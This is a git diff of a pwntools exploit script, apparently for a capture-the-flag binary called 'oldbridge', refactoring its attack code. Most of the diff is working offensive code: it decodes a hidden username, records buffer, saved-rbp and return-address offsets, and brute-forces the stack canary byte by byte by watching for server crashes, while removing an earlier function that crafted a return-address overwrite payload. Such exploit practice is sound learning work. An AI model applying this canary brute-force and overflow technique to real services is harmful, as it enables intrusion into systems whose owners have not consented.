@@ -55,6 +55,10 @@ continue
 # NX:       NX enabled
 # PIE:      PIE enabled
 
+# constants
+SUCCESS_MSG = "Username found!"
+PROMPT_MSG = "Username: "
+
 # create session
 context.terminal = ['xfce4-terminal', '-e']
 config = {}
@@ -62,53 +66,51 @@ create_session("oldbridge", args.LOCAL)
 
 # username found in binary
 config['username'] = ''.join(str(chr(ord(x) ^ 13)) for x in "il{dih")
-# buffer size
+# buffer size (buffer size = cookie offset)
 config['buf_size'] = 1032
+# rbp offset
+config['rbp_off'] = 1040
+# rip offset
+config['rip_off'] = 1048
+# stack: |buffer|cookie|rbp|rip|
 
-# send some string to the server and check if it crashed
-# buffer size = 1032
-# stack cookie after buffer
-# any string > 1032 that does not match the cookie => crash
-def check_server(data, padding = False):
+# create a connection to the server
+# send some data
+# check if it crashed ;)
+def server_check(prefix_size, data):
     io = start()
-
-    if len(data) > config['buf_size'] - len(config['username']):
-        log.error("You are trying to send something too big")
-    if padding:
-        to_send = config['username'] + cyclic(config['buf_size'] - len(config['username'])) + data
-    else:
-        to_send = config['username'] + data
-
-    io.sendafter("Username: ", to_send)
+    to_send = config['username'] + \
+              cyclic(prefix_size - len(config['username'])) + \
+              data
+    io.sendafter(PROMPT_MSG, to_send)
     recv_data = io.clean()
     io.close()
 
-    return "Username found!" in recv_data
+    return SUCCESS_MSG in recv_data
 
-def brute_force_cookie(logging = False):
-    cookie = ""
+# bruteforce a 8 byte long value on the stack
+# offset -> offset from the buffer
+def bruteforce_value(offset):
+    value = ""
     for y in range(8):
-        if logging:
-            log.info("Bruteforcing byte {}".format(y + 1))
+        log.info("Bruteforcing byte {}".format(y + 1))
         for x in range(0x100):
-            temp_cookie = cookie + chr(x)
-            if logging:
-                log.info("Trying {}".format(hex(x)))
+            temp_value = value + chr(x)
+            log.info("Trying {}".format(hex(x)))
 
-            alive = check_server(temp_cookie, padding = True)
+            alive = server_check(offset, temp_value)
             if alive:
-                if logging:
-                    log.success("Found byte {}".format(hex(x)))
+                log.success("Found byte {}".format(hex(x)))
 
-                cookie = temp_cookie
+                value = temp_value
                 break
 
-    if logging:
-        if len(cookie) == 8:
-            log.success("Got cookie: " + cookie)
-        else:
-            log.error("Cookie not found")
-    return cookie
+    print (len(value), value)
+    if len(value) == 8:
+        log.success("Found: " + value)
+    else:
+        log.error("Bruteforce failed")
+    return value
 
 # load session
 if args.LOAD:
@@ -117,34 +119,15 @@ if args.LOAD:
 
 # we need the stack cookie to do a proper exploit
 if 'cookie' not in config:
-    config['cookie'] = brute_force_cookie(logging = True)
+    config['cookie'] = bruteforce_value(config['buf_size'])
 
-config['rip_off'] = 1048
-def craft_rip_overwrite(data):
-    user_cookie_pad = config['buf_size'] - len(config['username'])
-    cookie_rip_pad = config['rip_off'] - user_cookie_pad - \
-                     len(config['username']) - len(config['cookie'])
-
-    to_send = config['username'] + \
-           cyclic(user_cookie_pad) + \
-           config['cookie'] + \
-           cyclic(cookie_rip_pad) + \
-           data
-
-    print (to_send, len(to_send))
-    return to_send
-
-
-#alive = check_server(config['cookie'], padding = True)
+#alive = check_cookie(config['cookie'], padding = True)
 #if not alive:
 #    log.error("Stack cookie is wrong")
 
-io = start()
-config['check_username_off'] = 0x0B6F
-#payload = craft_rip_overwrite(p64(config['check_username_off'])[:2])
-payload = craft_rip_overwrite("AAAAAAAA")
-log.info("Payload")
-io.sendafter("Username: ", payload)
-io.interactive()
+
+#log.info("Payload")
+#io.sendafter(PROMPT_MSG, payload)
+#print (io.clean())
 # save the session
 save_vars(config)
